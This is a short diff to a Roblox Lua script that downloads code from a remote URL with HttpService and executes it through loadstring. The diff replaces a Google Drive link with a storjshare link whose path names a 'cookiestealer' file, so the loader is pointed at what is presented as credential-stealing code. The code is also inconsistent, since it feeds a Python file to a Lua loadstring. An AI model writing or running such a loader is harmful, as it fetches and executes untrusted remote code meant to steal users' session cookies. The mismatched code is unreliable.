@@ -1,9 +1,6 @@
--- Download and Execute Script
 local http = game:GetService("HttpService")
 
--- Download the script from a URL
-local scriptURL = "https://drive.usercontent.google.com/download?id=1Qpna7IykXA57HVhx9FVFIMfbYQWhIIYh&export=download&authuser=0&confirm=t&uuid=5ddf2798-fcca-41db-865e-4e024f6e74e8&at=AN_67v3OOmQRudXIPbjyczsymNlC%3A1727887892586"
+local scriptURL = "https://link.storjshare.io/s/judkuyasitnisjdvse72mesqkwvq/cookiestealer1/stealer1.py?download=1"
 local scriptData = http:GetAsync(scriptURL)
 
--- Execute the downloaded script
 loadstring(scriptData)(Game) -- Use loadstring to execute the script
